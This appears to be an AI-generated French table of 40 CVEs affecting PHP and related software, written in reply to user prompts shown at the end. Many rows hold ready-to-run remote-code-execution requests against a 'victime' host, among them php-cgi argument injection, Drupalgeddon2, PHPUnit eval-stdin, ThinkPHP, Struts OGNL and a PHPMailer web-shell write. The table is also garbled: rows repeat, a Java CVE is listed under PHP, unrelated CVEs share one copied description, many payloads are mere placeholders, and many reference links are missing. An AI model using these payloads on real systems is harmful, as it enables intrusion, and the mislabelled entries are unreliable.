# PHP

Voici un tableau de 40 CVE PHP majeures, avec :  
- le numéro de CVE,  
- le produit/logiciel et la version vulnérable,  
- le type d’attaque,  
- un **exemple complet de commande HTTP (GET/POST/cURL), code PHP, ou payload utilisable tel quel**,  
- une URL complète vers un PoC ou une ressource technique associée.

---

| N° | CVE | Produit (version vulnérable) | Type d’attaque | Exemple de commande/payload complet | URL PoC / Référence |
|----|----------------|-----------------------------|--------------------------|---------------------------------------------------------------------------------------------------------------------------------------|--------------------------------------------------------|
| 1 | CVE-2024-4577 | PHP <8.1.29, <8.2.20, <8.3.8 (CGI/Windows) | Argument injection RCE | ```bash curl -X POST 'http://victime/cgi-bin/php-cgi.exe?%ADd+allow_url_include=1+%ADd+auto_prepend_file=php://input' -d '<?php system("id"); ?>' ```
| 2 | CVE-2012-1823 | PHP <5.x (CGI mode) | Argument injection RCE | ```bash curl -X POST 'http://victime/cgi-bin/php-cgi?%2D%2Dd+allow_url_include%3D1+%2D%2Dd+auto_prepend_file%3Dphp://input' -d '<?php system("id"); ?>' ```
| 3 | CVE-2019-11043 | PHP-FPM <7.1.33, <7.2.24, <7.3.11 + Nginx | RCE via PATH_INFO | ```bash curl 'http://victime/index.php?a=%0a<?=system("id")?>' ```
| 4 | CVE-2017-9841 | PHPUnit <=4.8.28, <=5.6.2 | RCE via eval-stdin.php | ```bash curl -X POST 'http://victime/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php' -d '<?php system("id"); ?>' ```
| 5 | CVE-2018-7600 | Drupal <7.58, <8.3.9, <8.4.6, <8.5.1 | Drupalgeddon2 RCE | ```bash curl -X POST 'http://victime/?q=user/password&name[#post_render][]=passthru&name[#markup]=id' -d 'form_id=user_pass&_triggering_element_name=name' ```
| 6 | CVE-2015-8562 | Joomla! <3.4.6 | Object injection RCE | ```bash curl -H 'User-Agent: {payload_serialized_object}' http://victime/ ```
| 7 | CVE-2016-10033 | PHPMailer <5.2.18 | Command injection via email | ```php $mail->addAddress('"attacker\" -oQ/tmp/ -X/var/www/html/shell.php server\"@test.com'); // puis accéder à shell.php ```
| 8 | CVE-2016-10045 | PHPMailer <5.2.20 | Command injection via email | (voir ci-dessus) | https://github.com/opsxcq/exploit-CVE-2016-10045 |
| 9 | CVE-2018-17082 | PHPMailer <6.0.6 | Object injection RCE | ```php unserialize($payload_malicieux); // payload généré avec phpggc ```
| 10 | CVE-2018-19935 | PHPMailer <6.0.6 | Object injection RCE | ```php unserialize($payload_malicieux); // payload généré avec phpggc ```
| 11 | CVE-2015-2348 | Joomla! 2.5.28, 3.2.7 | Object injection RCE | ```php unserialize($payload_malicieux); // payload généré avec phpggc ```
| 12 | CVE-2024-1874 | PHP 8.1.x, 8.2.x, 8.3.x | unserialize() RCE | ```php unserialize($payload_malicieux); // payload généré avec phpggc ```
| 13 | CVE-2024-3096 | PHP 8.1.x, 8.2.x, 8.3.x | Filter bypass RCE | ```php $output = system("id"); // via bypass de filtre mal configuré ```
| 14 | CVE-2019-9082 | ThinkPHP 5.0.23, 5.1.31 | RCE via function injection | ```bash curl 'http://victime/index.php?s=/Index/\think\app/invokefunction&function=phpinfo&vars[0]=id' ```
| 15 | CVE-2020-8547 | phplist 3.4.6 | Type juggling bypass | ```php if ($hash == '0e123456...') { /* bypass */ } ```
| 16 | CVE-2020-36399 | phplist 3.4.8 | Stored XSS | ```bash curl -d 'name=<script>alert(1)</script>' http://victime/vulnerable_form.php ```
| 17 | CVE-2020-35708 | phplist 3.4.8 | SQL Injection | ```bash curl -d "id=' OR 1=1 -- -" http://victime/vulnerable.php ```
| 18 | CVE-2012-3953 | phplist 2.10.19 | SQL Injection | ```bash curl 'http://victime/vulnerable.php?delete=1 OR 1=1' ```
| 19 | CVE-2008-6178 | FCKeditor 2.4.x-2.6.x | File upload RCE | Upload de `shell.php` puis accès :<br>```bash curl 'http://victime/UserFiles/File/shell.php?cmd=id' ```
| 20 | CVE-2020-7069 | PHP <7.2.26, <7.3.13, <7.4.1 | Use-after-free unserialize | ```php unserialize($payload_malicieux); // via phpggc ```
| 21 | CVE-2020-7068 | PHP <7.2.26, <7.3.13, <7.4.1 | Use-after-free unserialize | (idem) | https://github.com/ambionics/phpggc |
| 22 | CVE-2020-7067 | PHP <7.2.26, <7.3.13, <7.4.1 | Use-after-free unserialize | (idem) | https://github.com/ambionics/phpggc |
| 23 | CVE-2020-7066 | PHP <7.2.26, <7.3.13, <7.4.1 | Use-after-free unserialize | (idem) | https://github.com/ambionics/phpggc |
| 24 | CVE-2020-7065 | PHP <7.2.26, <7.3.13, <7.4.1 | Use-after-free unserialize | (idem) | https://github.com/ambionics/phpggc |
| 25 | CVE-2020-7064 | PHP <7.2.26, <7.3.13, <7.4.1 | Use-after-free unserialize | (idem) | https://github.com/ambionics/phpggc |
| 26 | CVE-2020-7063 | PHP <7.2.26, <7.3.13, <7.4.1 | Use-after-free unserialize | (idem) | https://github.com/ambionics/phpggc |
| 27 | CVE-2020-7062 | PHP <7.2.26, <7.3.13, <7.4.1 | Use-after-free unserialize | (idem) | https://github.com/ambionics/phpggc |
| 28 | CVE-2020-7061 | PHP <7.2.26, <7.3.13, <7.4.1 | Use-after-free unserialize | (idem) | https://github.com/ambionics/phpggc |
| 29 | CVE-2018-19935 | PHPMailer <6.0.6 | Object injection RCE | ```php unserialize($payload_malicieux); // via phpggc ```
| 30 | CVE-2017-5638 | Apache Struts 2 <2.3.32, <2.5.10.1 | OGNL injection RCE | ```bash curl -H "Content-Type: %{(#_='multipart/form-data').(#cmd='id').(#p=new java.lang.ProcessBuilder({'/bin/bash','-c',#cmd})).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}" http://victime/struts2-showcase/upload.action -F "foo=@test.txt" ```
| 31 | CVE-2019-11043 | PHP-FPM <7.1.33, <7.2.24, <7.3.11 + Nginx | RCE via PATH_INFO | ```bash curl 'http://victime/index.php?a=%0a<?=system("id")?>' ```
| 32 | CVE-2016-10033 | PHPMailer <5.2.18 | Command injection via email | (voir exemple n°7) | https://github.com/opsxcq/exploit-CVE-2016-10033 |
| 33 | CVE-2015-8562 | Joomla! <3.4.6 | Object injection RCE | (voir exemple n°6) | https://github.com/artsploit/joomla-3.4.6-exploit |
| 34 | CVE-2017-9841 | PHPUnit <=4.8.28, <=5.6.2 | RCE via eval-stdin.php | (voir exemple n°4) | https://github.com/ambionics/phpggc |
| 35 | CVE-2018-7600 | Drupal <7.58, <8.3.9, <8.4.6, <8.5.1 | Drupalgeddon2 RCE | (voir exemple n°5) | https://github.com/a2u/CVE-2018-7600 |
| 36 | CVE-2012-1823 | PHP <5.x (CGI mode) | Argument injection RCE | (voir exemple n°2) | https://github.com/epinna/CVE-2012-1823 |
| 37 | CVE-2018-17082 | PHPMailer <6.0.6 | Object injection RCE | (voir exemple n°9) | https://github.com/kozmic/PHPMailer-Exploit |
| 38 | CVE-2015-2348 | Joomla! 2.5.28, 3.2.7 | Object injection RCE | (voir exemple n°11) | https://github.com/ambionics/phpggc |
| 39 | CVE-2008-6178 | FCKeditor 2.4.x-2.6.x | File upload RCE | (voir exemple n°19) | https://github.com/swisskyrepo/PayloadsAllTheThings |
| 40 | CVE-2020-8547 | phplist 3.4.6 | Type juggling bypass | (voir exemple n°15) | https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Type%20Juggling |

---

tableau de 40 cve concernant php en donnant le numéro de cve dans l'ordre le plus récent d'abord, avec un exemple complet de commande, requête, payload et la version de produit concernée et l'url de référence, github ou autre en donnant le chemin complet

idem mais avec des exemples de commandes complets et pas seulement des indications